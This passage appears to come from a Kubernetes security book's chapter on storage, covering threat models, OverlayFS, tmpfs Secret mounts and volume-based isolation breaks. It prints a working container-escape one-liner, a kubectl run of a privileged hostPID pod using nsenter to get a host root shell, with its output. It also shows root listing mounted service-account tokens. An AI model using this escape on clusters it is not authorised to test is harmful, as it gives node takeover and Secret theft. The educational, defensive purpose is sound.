<html><head></head><body><div id="sbo-rt-content"><section data-type="chapter" epub:type="chapter" data-pdf-bookmark="Chapter 6. Storage"><div class="chapter" id="ch-storage">
<h1><span class="label">Chapter 6. </span>Storage</h1>


<p>Your organization is valued by its data. That could be customer records and billing details, business secrets, or intellectual property. Customers and information collected over a company’s lifetime are valuable and the swarthy buccaneers of Captain Hashjack’s binary pirates are only paid in plunder.</p>

<p>Consider what identity fraudsters and nation states will pay for personal information. And if your data’s not valuable to them, you might get cryptolocked for a ransom, with the attacker likely to take the additional bonus of stealing your data while they’re in your systems.</p>

<p>BCTL holds personal data on customers and employees like location, medical and financial records, secret information like credit card details, and delivery addresses. Your customers entrust these details to you, and you persist them on a filesystem, database, or network storage system (NFS, object store, NAS, etc.). For containers to access this data from Kubernetes pods they must use the network or, for larger data or lower latency requirements, use disks attached to the host system.</p>

<p>Mounting a host filesystem into a <a data-type="indexterm" data-primary="containers" data-secondary="filesystems" id="idm45302812715488"/><a data-type="indexterm" data-primary="filesystems" data-secondary="containers" id="idm45302812714640"/><a data-type="indexterm" data-primary="isolation boundaries, containers, mounting filesystems" id="idm45302812713792"/>container breaks an isolation boundary with the host’s filesystem, and provides a potentially navigable route for an attacking pirate to consider.</p>

<p>When a container’s<a data-type="indexterm" data-primary="storage" data-secondary="attack strategies" id="idm45302812712512"/><a data-type="indexterm" data-primary="attacks" data-secondary="storage, strategies" id="idm45302812711664"/> storage is accessible across a network, the most effective attacking strategy is to steal access keys and impersonate a legitimate application. Captain Hashjack may attack the application requesting keys (a container workload), a key store (the API server’s Secrets endpoint, or <code>etcd</code>), or the application’s host (the worker node). When Secrets are at rest they risk being accessed, modified, or stolen by a nefarious actor.</p>

<p>In this chapter we explore what a filesystem is made of, and how to protect it from rascally attackers.</p>






<section data-type="sect1" data-pdf-bookmark="Defaults"><div class="sect1" id="idm45302812709344">
<h1>Defaults</h1>

<p>Where can an application in Kubernetes <a data-type="indexterm" data-primary="storage" data-secondary="filesystems, persistence" id="idm45302812707968"/><a data-type="indexterm" data-primary="filesystems" data-secondary="storage, persistence" id="idm45302812707120"/>store data? Each container in a pod has
its own local filesystem, and temporary directories on it. This is perhaps
<em>/tmp</em>, or <em>/dev/shm</em> for shared memory if the kernel supports it. The
local filesystem is linked to the pod’s lifecycle, and is discarded when
the pod is stopped.</p>

<p>Containers in a pod do not share a mount <a data-type="indexterm" data-primary="namespaces" data-secondary="filesystem visibility and" id="idm45302812704704"/>namespace, which means they cannot see each other’s local filesystems. To share data, they can use a <em>shared volume</em>,
a filesystem that’s mounted at a directory in the container’s local filesystem such as <em>/mnt/foo</em>. This is also bound to the pod’s lifecycle, and is a <code>tmpfs</code> mount from the underlying host.</p>

<p>To persist data beyond a <a data-type="indexterm" data-primary="pods" data-secondary="persisting data" id="idm45302812701968"/><a data-type="indexterm" data-primary="data" data-secondary="persisting" id="idm45302812701120"/>pod’s lifespan, persistent volumes<a data-type="indexterm" data-primary="persistent volumes" id="idm45302812700144"/> are used (see <a data-type="xref" href="#volumes-datastores">“Volumes and Datastores”</a>). They are configured and provided at the cluster level, and survive pod terminations.</p>

<p>Access to other pods’ persistent volumes is a danger to the confidentiality of sensitive workloads.</p>
</div></section>













<section data-type="sect1" data-pdf-bookmark="Threat Model"><div class="sect1" id="idm45302812698048">
<h1>Threat Model</h1>

<p>The greatest concern to <a data-type="indexterm" data-primary="threat models" data-secondary="storage" id="thrtmod_storage"/><a data-type="indexterm" data-primary="storage" data-secondary="threat models" id="stor_thrtmod"/>storage is your data being leaked. Attackers that can
access data at rest may be able to extract sensitive customer and user information,
attack other systems with the new knowledge they have found, or set up a cryptolocked ransom scenario.</p>
<div data-type="tip"><h6>Tip</h6>
<p>Configure your<a data-type="indexterm" data-primary="API server" data-secondary="encrypting data" id="idm45302812693040"/><a data-type="indexterm" data-primary="data" data-secondary="encrypting, API server and" id="idm45302812692192"/> API server to
<a href="https://oreil.ly/7KJmT">encrypt Secrets at rest</a>
in <code>etcd</code>, and store<a data-type="indexterm" data-primary="storage" data-secondary="Secrets" id="idm45302812690048"/> Secrets in a Secrets store like KMS or Hashicorp Vault, encrypted files, or physically secured storage.</p>
</div>

<p>Kubernetes storage uses <a data-type="indexterm" data-primary="storage" data-secondary="volumes" id="idm45302812688272"/><a data-type="indexterm" data-primary="volumes" data-secondary="storage" id="idm45302812687296"/>volumes, which are a similar concept to Docker’s volumes.
These volumes are used to persist state outside of a container, which by design can
not persist files inside its own filesystem. Volumes are also used to share files between containers in a pod.</p>

<p>Volumes appear as a directory inside the <a data-type="indexterm" data-primary="containers" data-secondary="storage volumes" id="idm45302812685504"/>container, possibility including data if the storage behind the volume is already populated. How that directory is added by the container runtime is determined by the volume type. Many volume types are supported, including historically vulnerable protocols such as Network File System (NFS) and Internet Small Computer Systems Interface (iSCSI), as well as plug-ins such as <code>gitRepo</code> (an empty volume that runs a custom Git checkout step before mounting into the container).</p>
<div data-type="warning" epub:type="warning"><h6>Warning</h6>
<p>The <code>gitRepo</code> volume <a data-type="indexterm" data-primary="gitRepo volume plug-in, attacks" id="idm45302812681840"/>plug-in required the <code>kubelet</code> to run <code>git</code> in a shell on the host, which exposed Kubernetes to attacks on Git such as <a href="https://oreil.ly/wPyPQ">CVE-2017-1000117</a>. While this required an attacker to have create pod permissions, the convenience of the feature was not enough to justify the increased attack surface, and the <a href="https://oreil.ly/SnFim">volume type was deprecated</a> (there’s an <a href="https://oreil.ly/bTZ6M">easy init container workaround</a>).</p>
</div>

<p>Storage is an integration with underlying hardware, and so the threats depend upon how you have configured the storage. There are many types of storage drivers and you should choose one that makes sense for you and the team that will support it.</p>

<p>You should care about <a data-type="indexterm" data-primary="storage" data-secondary="lifecycle" id="idm45302812676816"/>your data when it is created and generated by an application, stored by persisting to storage, backed up by encrypting and moving to long-term storage media, retrieved again from storage to be shown to users, and deleted from short- and long-term storage, as shown in <a data-type="xref" href="#storage-data-lifecycle">Figure 6-1</a>.</p>

<figure><div id="storage-data-lifecycle" class="figure">
<img src="Images/haku_0601.png" alt="Storage Data Lifecycle, http://people.cs.pitt.edu/~adamlee/pubs/2005/storagess05threat.pdf" width="1019" height="1158"/>
<h6><span class="label">Figure 6-1. </span>Storage data lifecycle</h6>
</div></figure>

<p class="pagebreak-before">The <a data-type="indexterm" data-primary="STRIDE" data-secondary="storage threats and" id="idm45302812671824"/>STRIDE threat modeling framework lends itself well to this <a data-type="indexterm" data-primary="threat models" data-secondary="storage" data-startref="thrtmod_storage" id="idm45302812670688"/><a data-type="indexterm" data-primary="storage" data-secondary="threat models" data-startref="stor_thrtmod" id="idm45302812669392"/>practice. The STRIDE mnemonic stands for:</p>
<dl>
<dt>Spoofing (authenticity)</dt>
<dd>
<p>If an attacker can change data, they can implant false data and user accounts.</p>
</dd>
<dt>Tampering (integrity)</dt>
<dd>
<p>Data under an attacker’s control can be manipulated, cryptolocked, or deleted.</p>
</dd>
<dt>Repudiation (undeniable proof)</dt>
<dd>
<p>Cryptographic signing of metadata about stored files ensures changed files cannot be validated, unless the attacker controls the signing key and regenerates the signed metadata.</p>
</dd>
<dt>Information disclosure (confidentiality)</dt>
<dd>
<p>Many systems leak sensitive information in debug and log data, and container mount points leak the host’s device and disk abstractions.</p>
</dd>
<dt>Denial of service (availability)</dt>
<dd>
<p>Data can be removed, disk throughput or IOPS exhausted, and quotas or limits used up.</p>
</dd>
<dt>Elevation of privilege (authorization)</dt>
<dd>
<p>External mounts may enable container breakout.</p>
</dd>
</dl>
</div></section>













<section data-type="sect1" data-pdf-bookmark="Volumes and Datastores"><div class="sect1" id="volumes-datastores">
<h1>Volumes and Datastores</h1>

<p>In this section we review relevant storage concepts in Kubernetes.</p>








<section data-type="sect2" data-pdf-bookmark="Everything Is a Stream of Bytes"><div class="sect2" id="idm45302812656928">
<h2>Everything Is a Stream of Bytes</h2>

<p>It’s often said that, in Linux, “everything is a file.” Well that’s not entirely
true: everything can be treated “as a file” for reading or writing, using a file
descriptor. Think of a<a data-type="indexterm" data-primary="file descriptors" id="idm45302812655168"/><a data-type="indexterm" data-primary="Linux" data-secondary="file descriptors" id="idm45302812654464"/> file descriptor like a reference to a library book,
in a section, on a shelf, pointing to a specific word on a certain page.</p>

<p>There are seven types of file descriptors in Linux: a file, directory, character device,
block device, pipe, symbolic link, and socket. That’s broadly covering files,
hardware devices, virtual devices, memory, and networking.</p>

<p>When we have a file descriptor pointing to something useful, we can communicate
using a stream of binary data flowing into it (when we’re writing to it), or out of
it (when we’re reading from it).</p>

<p>That goes for files, display drivers, sound cards, network interfaces,
everything the system is connected to and aware of. So it’s more correct to say
that in Linux “everything is a stream of bytes.”</p>

<p>From within the humble <a data-type="indexterm" data-primary="containers" data-secondary="writing to" id="idm45302812650928"/>container we are just running a standard Linux process,
so all this is also true for a container. The container is “just Linux,” so your interaction with it is via a stream of bytes too.</p>
<div data-type="note" epub:type="note"><h6>Note</h6>
<p>Remember that “stateless containers” don’t <a data-type="indexterm" data-primary="stateless containers" id="idm45302812648544"/><a data-type="indexterm" data-primary="containers" data-secondary="stateless" id="idm45302812647840"/>want to persist important data to their local filesystem, but they still need inputs and outputs to be useful. State must exist; it’s safer to store it in a database or external system to achieve cloud native benefits like elastic scaling and resilience to failure.</p>
</div>

<p>All processes in a <a data-type="indexterm" data-primary="containers" data-secondary="processes, writing data" id="idm45302812645968"/><a data-type="indexterm" data-primary="processes" data-secondary="containers, writing data" id="idm45302812644960"/>container will probably want to write data at some point in their lifecycle. That may be a read or write to the network, or writing variables to memory or a temporary file to disk, or reading information from the kernel like “what’s the most memory can I allocate?”</p>

<p>When the container’s process wants to write data “to disk,” it uses the read/write layer on top of a container image. This layer is created at runtime, and doesn’t affect the rest of the immutable image. So the process first writes to its local filesystem inside the container, which is mounted from the host using OverlayFS. OverlayFS<a data-type="indexterm" data-primary="OverlayFS" id="idm45302812642896"/> proxies the data the process is writing onto the host’s filesystem (e.g., <code>ext4</code> or <code>ZFS</code>).</p>
</div></section>













<section data-type="sect2" data-pdf-bookmark="What’s a Filesystem?"><div class="sect2" id="idm45302812641008">
<h2>What’s a Filesystem?</h2>

<p>A filesystem <a data-type="indexterm" data-primary="filesystems" data-secondary="overview" id="filesys_oview"/><a data-type="indexterm" data-primary="volumes" data-secondary="filesystems" id="vol_fsys_oview"/>is a way of ordering and retrieving data on a volume, like a filing system or library index.</p>

<p>Linux uses a single virtual filesystem (VFS), <a data-type="indexterm" data-primary="virtual filesystems (VFSs)" data-see="VFSs (virtual filesystems)" id="idm45302812636160"/><a data-type="indexterm" data-primary="VFSs (virtual filesystems)" id="idm45302812635248"/>mounted at the <code>/</code> mount point,
to combine many other filesystems into one view. This is an abstraction to
allow standardized filesystem access. The kernel uses VFS also as a
filesystem interface for userspace programs.</p>

<p>“Mounting” a filesystem <a data-type="indexterm" data-primary="filesystems" data-secondary="mounting" id="idm45302812633200"/>creates a <code>dentry</code>, which represents a directory entry
in the kernel’s <code>vfsmount</code> table. When we <code>cd</code> through a filesystem, we are
interacting with instances of the <code>dentry</code> data structure to retrieve information
about the files and directories we are viewing.</p>
<div data-type="tip"><h6>Tip</h6>
<p>We explore the filesystem from an attacker’s perspective in 
<span class="keep-together"><a data-type="xref" href="app01.xhtml#appendix-pod-attack">Appendix A</a></span>.</p>
</div>

<p>Virtual filesystems may be created on-demand, for example, <code>procfs</code> in <em>/proc</em>
and <code>sysfs</code> in <em>/sys</em>, or as map onto other filesystems as VFS does.</p>

<p>And each non-virtual<a data-type="indexterm" data-primary="non-virtual filesystems" id="idm45302812625008"/> filesystem must exist on a volume, which represents one or more media that store our data. The volume is what is presented to
the user: both a single SSD with an <code>ext4</code> filesystem, or many spinning disks
in a RAID or NAS storage array, may show up as a single volume and filesystem to the user.</p>

<p>We can physically read or write the data to a <a data-type="indexterm" data-primary="block devices" id="idm45302812622960"/><a data-type="indexterm" data-primary="volumes" data-secondary="block devices" id="idm45302812622256"/>tangible “block device” like an
SSD or a spinning disk, just like we use the pages and lines of text in a library book.
These abstractions are shown in <a data-type="xref" href="#storage-volume-diagram">Figure 6-2</a>.</p>

<figure><div id="storage-volume-diagram" class="figure">
<img src="Images/haku_0602.png" alt="storage-volume-diagram" width="675" height="528"/>
<h6><span class="label">Figure 6-2. </span>Elements of a Linux volume</h6>
</div></figure>

<p>Other types of virtual filesystems also <a data-type="indexterm" data-primary="VFSs (virtual filesystems)" data-secondary="volumeless" id="idm45302812617536"/>don’t have a volume, such as <code>udev</code>,
the “userspace /dev” filesystem that manages the device nodes in our
<em>/dev</em> directory—and <code>procfs</code>, which is usually mapped to <em>/proc</em> and
conveniently exposes Linux kernel internals through the filesystem.</p>

<p>The filesystem is what the user interacts with, but the volume may be a local
or remote disk, single disk, a distributed datastore across many disks, a virtual
filesystem, or combinations of those things.</p>

<p>Kubernetes allows us to mount a great variety of different volume types,
but the volume abstraction is transparent to the end user. Due to the volume’s
contract with the kernel, to the user viewing them each volumes appears<a data-type="indexterm" data-primary="filesystems" data-secondary="overview" data-startref="filesys_oview" id="idm45302812613584"/><a data-type="indexterm" data-primary="volumes" data-secondary="filesystems" data-startref="vol_fsys_oview" id="idm45302812612336"/> as a filesystem.</p>
</div></section>













<section data-type="sect2" data-pdf-bookmark="Container Volumes and Mounts"><div class="sect2" id="idm45302812640384">
<h2>Container Volumes and Mounts</h2>

<p>When a container <a data-type="indexterm" data-primary="containers" data-secondary="filesystems" data-tertiary="mounting" id="idm45302812609600"/><a data-type="indexterm" data-primary="filesystems" data-secondary="volumes, mounting" id="idm45302812608320"/><a data-type="indexterm" data-primary="volumes" data-secondary="mounting" id="idm45302812607376"/>starts, the container runtime mounts filesystems into its mount namespace, as seen here<a data-type="indexterm" data-primary="Docker" data-secondary="filesystems, mounting" id="idm45302812606304"/> in Docker:</p>

<pre data-type="programlisting" data-code-language="bash"><code class="nv">$ </code>docker run -it sublimino/hack df -h
Filesystem             Size  Used Avail Use% Mounted on
overlay                907G  532G  329G  62% /
tmpfs                   64M     <code class="m">0</code>   64M   0% /dev
shm                     64M     <code class="m">0</code>   64M   0% /dev/shm
/dev/mapper/tank-root  907G  532G  329G  62% /etc/hosts
tmpfs                   32G     <code class="m">0</code>   32G   0% /proc/asound
tmpfs                   32G     <code class="m">0</code>   32G   0% /proc/acpi
tmpfs                   32G     <code class="m">0</code>   32G   0% /sys/firmware</pre>

<p>Note that Docker appears to mount an <em>/etc/hosts</em> file from the host, which in this case is a device mapper “special file.” There are also special filesystems, including a <code>/dev/mapper/</code> device mapper. There are more, including <code>proc</code>, <code>sysfs</code>, <code>udev</code>,
and <code>cgroup2</code>, among others.</p>
</div></section>













<section data-type="sect2" data-pdf-bookmark="OverlayFS"><div class="sect2" id="idm45302812596784">
<h2>OverlayFS</h2>

<p>OverlayFS<a data-type="indexterm" data-primary="OverlayFS" data-secondary="creating filesystems" id="OFS_fs_creat"/><a data-type="indexterm" data-primary="filesystems" data-secondary="creating, OverlayFS" id="fs_creat_OFS"/> as shown in <a data-type="xref" href="#storage-overlay-fs-diagram">Figure 6-3</a> creates a single filesystem by combining multiple read-only mount points. To write back to the filesystem, it uses a
 “copy on write” layer that sits on top of the other layers. This makes it particularly useful to containers, but also to bootable “live CDs” (that can be used to run Linux) and other read-only 
<span class="keep-together">applications.</span></p>

<figure><div id="storage-overlay-fs-diagram" class="figure">
<img src="Images/haku_0603.png" alt="storage-overlay-fs-diagram" width="1183" height="639"/>
<h6><span class="label">Figure 6-3. </span>OverlayFS (source: <a href="https://oreil.ly/9mMA7">Kernel OverlayFS</a>)</h6>
</div></figure>

<p>The root of the container’s filesystem is provided by OverlayFS, and we can see that it leaks the host’s disk metadata and shows us the disk size and use. We can compare the rows by passing the <em>/</em> and <em>/etc/hosts</em> directories to <code>df</code>:</p>

<pre data-type="programlisting" data-code-language="bash"><code class="nv">$ </code>docker run -it sublimino/hack df -h / /etc/hosts
Filesystem             Size  Used Avail Use% Mounted on
overlay                907G  543G  319G  64% /
/dev/mapper/tank-root  907G  543G  319G  64% /etc/hosts</pre>

<p>Podman <a data-type="indexterm" data-primary="Podman" data-secondary="filesystems, mounting" id="idm45302812540560"/>does the same, although it mounts <em>/etc/hosts</em> from a different filesystem (note this uses <code>sudo</code> and is not rootless):</p>

<pre data-type="programlisting" data-code-language="bash"><code class="nv">$ </code>sudo podman run -it docker.io/sublimino/hack:latest df -h / /etc/hosts
Filesystem      Size  Used Avail Use% Mounted on
overlay         907G  543G  318G  64% /
tmpfs           6.3G  3.4M  6.3G   1% /etc/hosts</pre>

<p>Notably<a data-type="indexterm" data-primary="rootless Podman" data-secondary="filesystems" id="idm45302812553472"/> rootless Podman uses a userspace filesystem, <code>fuse-overlayfs</code>, to avoid requesting root privileges when configuring the filesystem. This restricts the impact of a bug in the filesystem code—as it’s not owned by root, it’s not a potential avenue for privilege escalation:</p>

<pre data-type="programlisting" data-code-language="bash"><code class="nv">$ </code>podman run -it docker.io/sublimino/hack:latest df -h / /etc/hosts
Filesystem      Size  Used Avail Use% Mounted on
fuse-overlayfs  907G  543G  318G  64% /
tmpfs           6.3G  3.4M  6.3G   1% /etc/hosts</pre>

<p>A volume must eventually be mapped to one or more physical disks if it persists data. Why is this important? Because it leaves a trail that an attacker can follow back to the host. The host can be attacked if there is a bug or misconfiguration in any of the software that interacts with that<a data-type="indexterm" data-primary="attacks" data-secondary="volumes" id="idm45302812521584"/><a data-type="indexterm" data-primary="volumes" data-secondary="attacks" id="idm45302812520736"/> volume.</p>
<div class="clear">
<figure class="informal no-frame width-35"><div id="captain5" class="figure">
<img src="Images/haku_0000.png" alt="captain" width="1086" height="1103"/>
<h6/>
</div></figure>
<p>Captain Hashjack may try to drop a script or binary onto the volume and then cause the host to execute it in a different process namespace. Or try to write a symlink that points to a legitimate file on the host, when read and resolved in the host’s mount namespace. If attacker-supplied input can be run “out of context” in a different namespace, container isolation can be broken.</p>
</div>

<p>Containers give us the <a data-type="indexterm" data-primary="containers" data-secondary="isolation" id="idm45302812515584"/>software-defined illusion of isolation from the host, but volumes are an obvious place for the abstraction to leak. Disks are historically error-prone and difficult to work with. The disk device <a data-type="indexterm" data-primary="disk devices, visibility" id="idm45302812497264"/>on the host’s filesystem isn’t really hidden from the containerized process by the container runtime. Instead, the mount namespace has called <code>pivot_root</code> and we’re operating in a subset of the host’s 
<span class="keep-together">filesystem.</span></p>

<p>With an attacker mindset, seeing the host’s disk on <em>/dev/mapper/tank-root</em> reminds us to probe the visible horizon<a data-type="indexterm" data-primary="OverlayFS" data-secondary="creating filesystems" data-startref="OFS_fs_creat" id="idm45302812494512"/><a data-type="indexterm" data-primary="filesystems" data-secondary="creating, OverlayFS" data-startref="fs_creat_OFS" id="idm45302812493264"/> and delve deeper.</p>
</div></section>













<section data-type="sect2" data-pdf-bookmark="tmpfs"><div class="sect2" id="idm45302812596160">
<h2>tmpfs</h2>

<p>A filesystem allows a<a data-type="indexterm" data-primary="filesystems" data-secondary="tmpfs" id="fs_tmpfs"/><a data-type="indexterm" data-primary="tmpfs" data-secondary="overview" id="tmpfs_oview"/> client to read or write data. But it doesn’t have to write the data when it’s told to, or even persist that data. The filesystem can do whatever it likes.</p>

<p>Usually the filesystem’s data is stored at rest on a physical disk, or collection of disks. In some cases, like the temporary filesystem <code>tmpfs</code>, everything is in memory and data is not permanently stored at all.</p>
<div data-type="note" epub:type="note"><h6>Note</h6>
<p><code>tmpfs</code> succeeded <code>ramfs</code> as Linux’s preferred temporary filesystem. It makes a preallocated portion of the host’s memory available for filesystem operations by creating a virtual filesystem in memory. This may be especially useful for scripts and data-intensive filesystem processes.</p>
</div>

<p>Containers use <code>tmpfs</code> filesystems to hide host filesystem paths. This is called “masking,” which is<a data-type="indexterm" data-primary="filesystems" data-secondary="masking" id="idm45302812545392"/><a data-type="indexterm" data-primary="masking, filesystems" id="idm45302812544416"/> anything that
hides a path or file from a user.</p>

<p>Kubernetes uses <code>tmpfs</code> too, to inject configuration into a container. This is a “12 factor app” principle:
configuration shouldn’t be inside a container; it should be added at runtime in the expectation that it’ll differ across
environments.</p>

<p>As with all filesystem <a data-type="indexterm" data-primary="root users" data-secondary="filesystem mounts and" id="idm45302812471984"/>mounts, the root user on the host can see everything. It needs to be able to debug the machine, so
this is a usual and expected security boundary.</p>

<p>Kubernetes can mount <a data-type="indexterm" data-primary="Secret files, mounting" id="idm45302812470304"/>Secret files into individual containers, and it does this using <code>tmpfs</code>. Every container Secret, like a service account token, has a <code>tmpfs</code> mount from the host to the container with the Secret in it.</p>

<p>Other mount namespaces shield the Secrets from other containers, but as the host creates and manages all these filesystems the host root user can read all the Secrets mounted by a <code>kubelet</code> for its hosted pods.</p>

<p>As root on the host, we can see all the Secrets our local <code>kubelet</code> has mounted for the pods running on the host using the <code>mount</code> command:</p>
<pre data-type="programlisting" data-code-language="bash" class="small no-indent">
<code class="nv">$ </code>mount <code class="p">|</code> grep secret
tmpfs on /var/lib/kubelet/.../kubernetes.io~secret/myapp-token-mwvw2 <code class="nb">type </code>tmpfs <code class="o">(</code>rw,relatime<code class="o">)</code>
tmpfs on /var/lib/kubelet/.../kubernetes.io~secret/myapp-token-mwvw2 <code class="nb">type </code>tmpfs <code class="o">(</code>rw,relatime<code class="o">)</code>
...
</pre>

<p>Each mount point is a self-contained filesystem, and so Secrets are stored in files on each filesystem. This utilizes the Linux permissions model to ensure confidentiality. Only the process in the container is authorized to read the Secrets mounted into it, and as ever root is omniscient <a data-type="indexterm" data-primary="filesystems" data-secondary="tmpfs" data-startref="fs_tmpfs" id="idm45302812458800"/><a data-type="indexterm" data-primary="tmpfs" data-secondary="overview" data-startref="tmpfs_oview" id="idm45302812457680"/>and can see, and do, almost anything:</p>
<pre data-type="programlisting" class="small">
gke-unmarred-poverties-2-default-pool-c838da77-kj28 ~ # ls -lasp \
    /var/lib/kubelet/pods/.../volumes/kubernetes.io~secret/default-token-w95s7/
total 4
0 drwxrwxrwt 3 root root  140 Feb 20 14:30 ./
4 drwxr-xr-x 3 root root 4096 Feb 20 14:30 ../
0 drwxr-xr-x 2 root root  100 Feb 20 14:30 ..2021_02_20_14_30_16.258880519/
0 lrwxrwxrwx 1 root root   31 Feb 20 14:30 ..data -&gt; ..2021_02_20_14_30_16.258880519/
0 lrwxrwxrwx 1 root root   13 Feb 20 14:30 ca.crt -&gt; ..data/ca.crt
0 lrwxrwxrwx 1 root root   16 Feb 20 14:30 namespace -&gt; ..data/namespace
0 lrwxrwxrwx 1 root root   12 Feb 20 14:30 token -&gt; ..data/token
</pre>
</div></section>













<section data-type="sect2" data-pdf-bookmark="Volume Mount Breaks Container Isolation"><div class="sect2" id="idm45302812491328">
<h2>Volume Mount Breaks Container Isolation</h2>

<p>We consider<a data-type="indexterm" data-primary="volumes" data-secondary="mounting" data-tertiary="attacks" id="vol_mount_atak"/><a data-type="indexterm" data-primary="attacks" data-secondary="volumes" data-tertiary="mounting" id="atak_vol_mount"/><a data-type="indexterm" data-primary="containers" data-secondary="volumes, attacks" id="cont_vols_atak"/> anything external introduced into the container, or the relaxing of any security controls, as an increased risk to a container’s security. The mount namespace is frequently used to mount read-only filesystems into a pod, and for safety’s sake should always be read-only when possible.</p>

<p>If a Docker server’s client-facing socket is mounted into a container as read-write, the container is able to use the<a data-type="indexterm" data-primary="Docker" data-secondary="privileged containers, security considerations" id="idm45302812447584"/> Docker client to start a new privileged container on the same host.</p>

<p>The privileged mode removes all security features and shares the host’s namespaces and devices. So an attacker in a privileged container is now able to break out of the container.</p>

<p>The simplest way of doing this is with the namespace manipulation tool <code>nsenter</code>, which <a data-type="indexterm" data-primary="nsenter, security considerations" id="nsent_seccons"/>will either enter existing namespaces, or start a process in entirely new 
<span class="keep-together">namespaces.</span></p>

<p>This command is very <a data-type="indexterm" data-primary="namespaces" data-secondary="nsenter, security considerations" id="idm45302812418544"/>similar to <code>docker exec</code>: it moves a current or new process into the specified namespace or namespaces. This has the effect of transporting the user of the shell session between different namespace environments.</p>
<div data-type="note" epub:type="note"><h6>Note</h6>
<p><code>nsenter</code> is considered a debugging tool and avoids entering <code>cgroups</code> in order to evade resource limits. Kubernetes and
<code>docker exec</code> respect these limits, as resource exhaustion may DOS the entire node server.</p>
</div>

<p>Here we will start Bash in the mount namespace of PID 1. It is critical to security, as with <em>/proc/self/exe</em>, to understand which namespace’s <em>/proc</em> filesystem is mounted on the local filesystem. Anything mounted from the host into the container gives us an opportunity to attack it:</p>

<pre data-type="programlisting" data-code-language="bash"><code class="nv">$ </code>nsenter --mount<code class="o">=</code>/proc/1/ns/mnt /bin/bash</pre>

<p>This command starts Bash in the mount namespace of PID 1. If a command is omitted, <code>/bin/sh</code> is the default.</p>

<p>If the calling process is in a container with its own mount namespace, the command starts Bash in this same container namespace and not the host’s.</p>

<p>However, if the calling process is sharing the host’s PID namespace, this command will exploit the <em>/proc/1/ns/mnt</em> link. Sharing the host’s PID namespace shows the host’s <em>/proc</em> inside the container’s <em>/proc</em>, showing the same process as previously with the addition of every other process in the target namespace.</p>

<p><a href="https://oreil.ly/KijgS">Duffie Cooley</a> and <a href="https://oreil.ly/imCJW">Ian Coldwater</a> pulled the canonical offensive Kubernetes one-liner together the first time they met (see <a data-type="xref" href="#tweet-duffie-nsenter">Figure 6-4</a>).</p>

<figure><div id="tweet-duffie-nsenter" class="figure">
<img src="Images/haku_0604.png" alt="haku 0604" width="1162" height="435"/>
<h6><span class="label">Figure 6-4. </span>Duffie Cooley’s powerful wizardry, escaping containers with <code>nsenter</code> in Kubernetes clusters that allow privileged containers and hostPID</h6>
</div></figure>

<p>Let’s have a closer look:</p>

<pre data-type="programlisting" data-code-language="bash"><code class="nv">$ </code><code>kubectl</code><code> </code><code>run</code><code> </code><code>r00t</code><code> </code><code>--restart</code><code class="o">=</code><code>Never</code><code> </code><code class="se">\
</code><code>  </code><code>-ti</code><code> </code><code>--rm</code><code> </code><code>--image</code><code> </code><code>lol</code><code> </code><code class="se">\
</code><code>  </code><code>--overrides</code><code> </code><code class="s1">'{"spec":{"hostPID": true, \
  "containers":[{"name":"1","image":"alpine",\
  "command":["nsenter","--mount=/proc/1/ns/mnt","--",\
  "/bin/bash"],"stdin": true,"tty":true,\
  "securityContext":{"privileged":true}}]}}'</code><code> </code><a class="co" id="co_storage_CO1-1" href="#callout_storage_CO1-1"><img src="Images/1.png" alt="1" width="12" height="12"/></a><code>

</code><code>r00t</code><code> </code><code>/</code><code> </code><code class="c"># id </code><a class="co" id="co_storage_CO1-2" href="#callout_storage_CO1-2"><img src="Images/2.png" alt="2" width="12" height="12"/></a><code class="c">
</code><code class="nv">uid</code><code class="o">=</code><code>0</code><code class="o">(</code><code>root</code><code class="o">)</code><code> </code><code class="nv">gid</code><code class="o">=</code><code>0</code><code class="o">(</code><code>root</code><code class="o">)</code><code> </code><code class="nv">groups</code><code class="o">=</code><code>0</code><code class="o">(</code><code>root</code><code class="o">)</code><code>,1</code><code class="o">(</code><code>bin</code><code class="o">)</code><code>,2</code><code class="o">(</code><code>daemon</code><code class="o">)</code><code>,3</code><code class="o">(</code><code>sys</code><code class="o">)</code><code>,4</code><code class="o">(</code><code>adm</code><code class="o">)</code><code>,...</code><code>

</code><code>r00t</code><code> </code><code>/</code><code> </code><code class="c"># ps faux </code><a class="co" id="co_storage_CO1-3" href="#callout_storage_CO1-3"><img src="Images/3.png" alt="3" width="12" height="12"/></a><code class="c">
</code><code>USER</code><code>     </code><code>PID</code><code> </code><code>%CPU</code><code> </code><code>%MEM</code><code>  </code><code>VSZ</code><code>  </code><code>RSS</code><code> </code><code>TTY</code><code>   </code><code>STAT</code><code> </code><code>START</code><code>  </code><code>TIME</code><code> </code><code>COMMAND</code><code>
</code><code>root</code><code>       </code><code class="m">2</code><code>  </code><code>0.0</code><code>  </code><code>0.0</code><code>    </code><code class="m">0</code><code>    </code><code class="m">0</code><code> </code><code>?</code><code>     </code><code>S</code><code>    </code><code>03:50</code><code>  </code><code>0:00</code><code> </code><code class="o">[</code><code>kthreadd</code><code class="o">]</code><code>
</code><code>root</code><code>       </code><code class="m">3</code><code>  </code><code>0.0</code><code>  </code><code>0.0</code><code>    </code><code class="m">0</code><code>    </code><code class="m">0</code><code> </code><code>?</code><code>     </code><code>I</code><code>&lt;</code><code>   </code><code>03:50</code><code>  </code><code>0:00</code><code>  </code><code class="se">\_</code><code> </code><code class="o">[</code><code>rcu_gp</code><code class="o">]</code><code>
</code><code>root</code><code>       </code><code class="m">4</code><code>  </code><code>0.0</code><code>  </code><code>0.0</code><code>    </code><code class="m">0</code><code>    </code><code class="m">0</code><code> </code><code>?</code><code>     </code><code>I</code><code>&lt;</code><code>   </code><code>03:50</code><code>  </code><code>0:00</code><code>  </code><code class="se">\_</code><code> </code><code class="o">[</code><code>rcu_par_gp</code><code class="o">]</code><code>
</code><code>root</code><code>       </code><code class="m">6</code><code>  </code><code>0.0</code><code>  </code><code>0.0</code><code>    </code><code class="m">0</code><code>    </code><code class="m">0</code><code> </code><code>?</code><code>     </code><code>I</code><code>&lt;</code><code>   </code><code>03:50</code><code>  </code><code>0:00</code><code>  </code><code class="se">\_</code><code> </code><code class="o">[</code><code>kworker/0:0H-kblockd</code><code class="o">]</code><code>
</code><code>root</code><code>       </code><code class="m">9</code><code>  </code><code>0.0</code><code>  </code><code>0.0</code><code>    </code><code class="m">0</code><code>    </code><code class="m">0</code><code> </code><code>?</code><code>     </code><code>I</code><code>&lt;</code><code>   </code><code>03:50</code><code>  </code><code>0:00</code><code>  </code><code class="se">\_</code><code> </code><code class="o">[</code><code>mm_percpu_wq</code><code class="o">]</code><code>
